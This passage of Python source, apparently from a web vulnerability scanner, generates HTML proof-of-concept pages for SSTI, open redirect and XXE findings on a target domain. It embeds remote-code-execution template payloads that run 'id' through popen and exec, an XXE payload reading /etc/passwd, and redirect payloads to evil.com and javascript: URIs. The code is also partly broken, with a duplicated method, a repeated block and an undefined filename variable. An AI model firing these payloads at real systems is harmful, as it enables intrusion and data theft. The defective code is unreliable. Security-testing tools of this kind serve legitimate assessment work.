        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSTI Vulnerability PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #9b59b6; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #9b59b6; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .method-post {{ background: #e74c3c; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .ssti-payload {{ background: #9b59b6; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 SSTI Vulnerability PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> SSTI vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <div style="text-align: center; margin: 20px 0;">
        <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab (SSTI will execute)</button>
        <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
        <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
        <button class="button" onclick="showDetails()">📊 Show Details</button>
    </div>
    
    <div class="result" id="result">
        Select a vulnerability from the dropdown above to start testing...<br><br>
        <strong>Note:</strong> SSTI tests may be blocked by browser security. Use the "Open in New Tab" button to test manually!
    </div>
    
    <div id="analysis" class="vuln-info" style="display: none;">
        <h3>🔍 SSTI Vulnerability Analysis</h3>
        <p><strong>What is SSTI?</strong></p>
        <p>Server-Side Template Injection (SSTI) allows attackers to inject malicious template code that gets executed on the server.</p>
        
        <p><strong>Common Template Engines:</strong></p>
        <ul>
            <li><strong>Jinja2 (Python):</strong> {{{{7*7}}}}, {{{{config}}}}</li>
            <li><strong>Twig (PHP):</strong> {{{{7*7}}}}, {{{{_self.env.registerUndefinedFilterCallback("exec")}}}}</li>
            <li><strong>Freemarker (Java):</strong> ${{7*7}}, ${{"freemarker.template.utility.Execute"?new()("id")}}</li>
            <li><strong>Thymeleaf (Java):</strong> #{{7*7}}, #{{T(java.lang.Runtime).getRuntime().exec('id')}}</li>
        </ul>
        
        <p><strong>Common Payloads:</strong></p>
        <div class="ssti-payload">{{{{7*7}}}}</div>
        <div class="ssti-payload">{{{{config}}}}</div>
        <div class="ssti-payload">{{{{request}}}}</div>
        <div class="ssti-payload">{{{{''.__class__.__mro__[1].__subclasses__()}}}}</div>
        <div class="ssti-payload">{{{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}}}</div>
        <div class="ssti-payload">{{{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}}}</div>
    </div>
    
    <div id="details" class="vuln-info" style="display: none;">
        <h3>📊 Vulnerability Details</h3>
        <p><strong>Total Vulnerabilities Found:</strong> {len(vuln_data)}</p>
        <p><strong>Target Domain:</strong> {base_domain}</p>
        <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <h4>Vulnerability Breakdown:</h4>
        <ul>
            <li><strong>GET Requests:</strong> {len([v for v in vuln_data if v['method'] == 'GET'])}</li>
            <li><strong>POST Requests:</strong> {len([v for v in vuln_data if v['method'] == 'POST'])}</li>
        </ul>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const urlBox = document.getElementById('urlBox');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            const vulnDetails = document.getElementById('vulnDetails');
            const selectedUrl = document.getElementById('selectedUrl');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            const vuln = vulnerabilities[vulnIndex];
            
            // Mostrar detalles de la vulnerabilidad
            vulnDetails.innerHTML = `
                <div class="method-badge method-${{vuln.method.toLowerCase()}}">${{vuln.method}}</div>
                <strong>URL:</strong> ${{vuln.url}}<br><br>
                <strong>Payload:</strong><br>
                <div class="payload-box">${{vuln.payload}}</div>
            `;
            
            selectedUrl.textContent = vuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                window.open(vuln.url, '_blank');
            }}
        }}
        
        function copyUrl() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                navigator.clipboard.writeText(vuln.url).then(() => {{
                    alert('URL copied to clipboard!');
                }});
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
    </script>
</body>
</html>"""
        
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_ssti.html"
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ SSTI PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_redirect_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para Open Redirect con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Extraer el dominio base de la primera URL
        from urllib.parse import urlparse
        if vulnerable_urls:
            base_domain = urlparse(vulnerable_urls[0]).netloc
            # Limpiar el dominio para usar como nombre de archivo
            clean_domain = base_domain.replace('www.', '').replace('.', '_')
        else:
            base_domain = "unknown"
            clean_domain = "unknown"
        
        # Crear nombre de archivo con formato: dominio_vulnerabilidad_timestamp.html
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_redirect.html"
        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            method = "GET"
            url = vuln_url
            payload = ""
            form_data = None
            
            # Si es un formulario, extraer datos
            if ' => ' in vuln_url:
                method = "POST"
                url_part = vuln_url.split(' => ')[0]
                url = url_part.split()[0]
                form_part = vuln_url.split(' => ')[1]
                try:
                    import ast
                    form_data = ast.literal_eval(form_part)
                    # Extraer payload del primer campo del formulario
                    if form_data:
                        payload = list(form_data.values())[0]
                except:
                    form_data = {}
            else:
                # Extraer payload de la URL
                from urllib.parse import parse_qs, urlparse
                parsed = urlparse(vuln_url)
                query_params = parse_qs(parsed.query)
                if query_params:
                    payload = list(query_params.values())[0][0]
            
            vuln_data.append({
                'index': i,
                'method': method,
                'url': url,
                'payload': payload,
                'form_data': form_data
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
            option_text = f"{vuln['method']} - {display_url} (Payload: {display_payload})"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Generar el HTML del PoC
        import json
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect Vulnerability PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #f39c12; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #f39c12; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .method-post {{ background: #e74c3c; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .redirect-payload {{ background: #f39c12; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Open Redirect Vulnerability PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> Open Redirect vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <div style="text-align: center; margin: 20px 0;">
        <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab (Redirect will execute)</button>
        <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
        <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
        <button class="button" onclick="showDetails()">📊 Show Details</button>
    </div>
    
    <div class="result" id="result">
        Select a vulnerability from the dropdown above to start testing...<br><br>
        <strong>Note:</strong> Open Redirect tests will redirect you to the target URL. Use the "Open in New Tab" button to test manually!
    </div>
    
    <div id="analysis" class="vuln-info" style="display: none;">
        <h3>🔍 Open Redirect Vulnerability Analysis</h3>
        <p><strong>What is Open Redirect?</strong></p>
        <p>Open Redirect vulnerabilities allow attackers to redirect users to malicious websites by manipulating redirect URLs.</p>
        
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li><strong>Phishing Attacks:</strong> Redirect users to fake login pages</li>
            <li><strong>Social Engineering:</strong> Trick users into visiting malicious sites</li>
            <li><strong>Credential Harvesting:</strong> Steal user credentials</li>
            <li><strong>Malware Distribution:</strong> Redirect to sites hosting malware</li>
        </ul>
        
        <p><strong>Common Payloads:</strong></p>
        <div class="redirect-payload">////google.com/</div>
        <div class="redirect-payload">https:///google.com/</div>
        <div class="redirect-payload">/https:google.com</div>
        <div class="redirect-payload">javascript:alert('redirect')</div>
        <div class="redirect-payload">//evil.com</div>
        <div class="redirect-payload">https://evil.com</div>
        <div class="redirect-payload">http://evil.com</div>
        <div class="redirect-payload">ftp://evil.com</div>
        <div class="redirect-payload">data:text/html,<h1>Evil</h1></div>
        <div class="redirect-payload">file:///etc/passwd</div>
    </div>
    
    <div id="details" class="vuln-info" style="display: none;">
        <h3>📊 Vulnerability Details</h3>
        <p><strong>Total Vulnerabilities Found:</strong> {len(vuln_data)}</p>
        <p><strong>Target Domain:</strong> {base_domain}</p>
        <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <h4>Vulnerability Breakdown:</h4>
        <ul>
            <li><strong>GET Requests:</strong> {len([v for v in vuln_data if v['method'] == 'GET'])}</li>
            <li><strong>POST Requests:</strong> {len([v for v in vuln_data if v['method'] == 'POST'])}</li>
        </ul>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const urlBox = document.getElementById('urlBox');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            const vulnDetails = document.getElementById('vulnDetails');
            const selectedUrl = document.getElementById('selectedUrl');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            const vuln = vulnerabilities[vulnIndex];
            
            // Mostrar detalles de la vulnerabilidad
            vulnDetails.innerHTML = `
                <div class="method-badge method-${{vuln.method.toLowerCase()}}">${{vuln.method}}</div>
                <strong>URL:</strong> ${{vuln.url}}<br><br>
                <strong>Payload:</strong><br>
                <div class="payload-box">${{vuln.payload}}</div>
            `;
            
            selectedUrl.textContent = vuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                window.open(vuln.url, '_blank');
            }}
        }}
        
        function copyUrl() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                navigator.clipboard.writeText(vuln.url).then(() => {{
                    alert('URL copied to clipboard!');
                }});
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
    </script>
</body>
</html>        """
        
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ Open Redirect PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }

    def generate_xxe_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para XXE con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_xxe.html"
        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            vuln_data.append({
                'index': i,
                'url': vuln_url,
                'method': 'POST',
                'payload': '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
            })
        
        # Generar contenido HTML básico
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXE Vulnerability PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .header {{ background: #e74c3c; color: white; padding: 20px; border-radius: 8px; text-align: center; margin-bottom: 20px; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; word-break: break-all; }}
        .btn {{ padding: 10px 20px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; }}
        .btn-primary {{ background: #007bff; color: white; }}
        .btn-success {{ background: #28a745; color: white; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔓 XXE Vulnerability PoC</h1>
            <p>Target: {base_domain}</p>
        </div>
        
        <div class="vulnerability-selector">
            <label for="vulnSelect"><strong>Select XXE Vulnerability:</strong></label>
            <select id="vulnSelect" onchange="showVulnerability()">
                <option value="">-- Select a vulnerability --</option>
                {''.join([f'<option value="{i}">XXE #{i+1}: {vuln["url"]}</option>' for i, vuln in enumerate(vuln_data)])}
            </select>
        </div>
        
        <div id="vulnDetails" style="display: none;">
            <div class="info-section">
                <h3>📊 Selected Vulnerability Details</h3>
                <p><strong>Method:</strong> <span id="method">POST</span></p>
                <p><strong>XXE Payload:</strong></p>
                <div class="payload-box" id="payload"></div>
                <p><strong>Full URL:</strong> <span id="fullUrl"></span></p>
            </div>
            
            <div class="button-group">
                <button class="btn btn-primary" onclick="openInNewTab()">🌐 Open in New Tab</button>
                <button class="btn btn-success" onclick="copyUrl()">📋 Copy URL</button>
            </div>
        </div>
        
        <div class="timestamp">
            Generated on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} by Neluxmatizer
        </div>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        
        function showVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const details = document.getElementById('vulnDetails');
            
            if (select.value === '') {{
                details.style.display = 'none';
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            const selectedVuln = vulnerabilities[vulnIndex];
            
            document.getElementById('method').textContent = selectedVuln.method;
            document.getElementById('payload').textContent = selectedVuln.payload;
            document.getElementById('fullUrl').textContent = selectedVuln.url;
            
            details.style.display = 'block';
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('vulnSelect');
            if (select.value === '') return;
            
            const vulnIndex = parseInt(select.value);
            const selectedVuln = vulnerabilities[vulnIndex];
            
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = selectedVuln.url;
            form.target = '_blank';
            
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'xml_data';
            input.value = selectedVuln.payload;
            form.appendChild(input);
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
        }}
        
        function copyUrl() {{
            const select = document.getElementById('vulnSelect');
            if (select.value === '') return;
            
            const vulnIndex = parseInt(select.value);
            const selectedVuln = vulnerabilities[vulnIndex];
            
            navigator.clipboard.writeText(selectedVuln.url).then(() => {{
                alert('URL copied to clipboard!');
            }});
        }}
    </script>
</body>
</html>"""
        
        # Guardar el archivo HTML
        html_path = os.path.join("output", "poc", html_filename)
        
        # Crear directorio si no existe
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return {
            'html_path': html_path,
            'html_filename': html_filename,
            'screenshot_path': None,
            'screenshot_filename': None
        }
    
    def generate_redirect_poc_old(self, target_url, method="GET", screenshot=False):
        """Genera PoC para Open Redirect"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en la URL para evitar sobrescribir PoCs
        import hashlib
        url_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
    
    def generate_redirect_poc_old(self, target_url, method="GET", screenshot=False):
        """Genera PoC para Open Redirect"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en la URL para evitar sobrescribir PoCs
        import hashlib
        url_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect PoC - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #f39c12; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #f39c12; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .payload {{ background: #2c3e50; color: #ecf0f1; padding: 15px; margin: 15px 0; border-radius: 5px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Open Redirect PoC</h1>
        <p>Target: <strong>{html.escape(target_url)}</strong></p>
        <p>Method: <strong>{method}</strong></p>
    </div>
    
    <div class="url-box">
        <strong>Vulnerable URL:</strong><br>
        {html.escape(target_url)}
    </div>
    
    <div class="payload">
        <strong>Open Redirect URLs to test:</strong><br>
        <select id="payloadSelect" onchange="updatePayload()" style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: white;">
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '////google.com/')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '////google.com/')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'https:///google.com/')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'https:///google.com/')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '/https:google.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '/https:google.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'javascript:alert(\'redirect\')')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'javascript:alert(\'redirect\')')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '//evil.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '//evil.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'https://evil.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'https://evil.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'http://evil.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'http://evil.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'ftp://evil.com')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'ftp://evil.com')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'data:text/html,<h1>Evil</h1>')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'data:text/html,<h1>Evil</h1>')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', 'file:///etc/passwd')}">{target_url.replace('PAYLOAD_PLACEHOLDER', 'file:///etc/passwd')}</option>
        </select>
        <div id="selectedPayload" style="background: #e74c3c; color: white; padding: 5px; margin: 5px 0; border-radius: 3px; font-family: monospace; word-break: break-all;">
            <strong>Method:</strong> {method}<br>
            <strong>URL:</strong> {target_url.replace('PAYLOAD_PLACEHOLDER', '////google.com/')}
        </div>
    </div>
    
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="copyUrl()">📋 Copy URL</button>
    <button class="button" onclick="copyPayload()">📋 Copy Payload</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showDetails()">📊 Show Details</button>
    
    <div id="analysis" class="analysis" style="background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none;">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> Open Redirect</p>
        <p><strong>Risk Level:</strong> MEDIUM</p>
        <p><strong>Impact:</strong> Phishing attacks, user redirection to malicious sites</p>
        <p><strong>Affected Parameter:</strong> Redirect URL parameter</p>
        <p><strong>Detection Method:</strong> URL manipulation for redirects</p>
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li>Phishing attacks</li>
            <li>Social engineering</li>
            <li>Malicious site redirection</li>
            <li>Credential harvesting</li>
        </ul>
        <div class="warning" style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0;">
            <strong>⚠️ Warning:</strong> Open Redirects can be used for phishing and social engineering attacks. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="details" class="details" style="background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace;">
        <h3>📊 Open Redirect Details</h3>
        <p><em>This shows what a successful redirect attack might reveal:</em></p>
        <div style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px;">
<strong>Redirect Behavior:</strong>
• Location header: 302/301 redirects
• JavaScript redirects: window.location
• Meta refresh: &lt;meta http-equiv="refresh"&gt;
• HTTP response: Location header

<strong>Common Payloads:</strong>
• ////google.com/
• https:///google.com/
• /https:google.com
• javascript:alert('redirect')

<strong>Impact Examples:</strong>
• Phishing site redirection
• Credential harvesting
• Malware distribution
• Social engineering attacks
        </div>
        <p><strong>Note:</strong> This is simulated content. The actual response will depend on the application's redirect handling.</p>
    </div>
    
    <script>
        function updatePayload() {{
            const select = document.getElementById('payloadSelect');
            const display = document.getElementById('selectedPayload');
            display.innerHTML = '<strong>Method:</strong> {method}<br><strong>URL:</strong> ' + select.value;
        }}
        
        function copyPayload() {{
            const select = document.getElementById('payloadSelect');
            const payload = select.value;
            navigator.clipboard.writeText(payload).then(function() {{
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying payload: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = payload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
</body>
</html>
        """
        
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ Redirect PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def _generate_form_html(self, target_url, form_data, method):
        """Genera HTML para mostrar los datos del formulario inyectado"""
        if not form_data:
            return ""
        
        form_fields = []
        for field_name, field_value in form_data.items():
            form_fields.append(f"""
                <div class="form-field">
                    <label><strong>{field_name}:</strong></label>
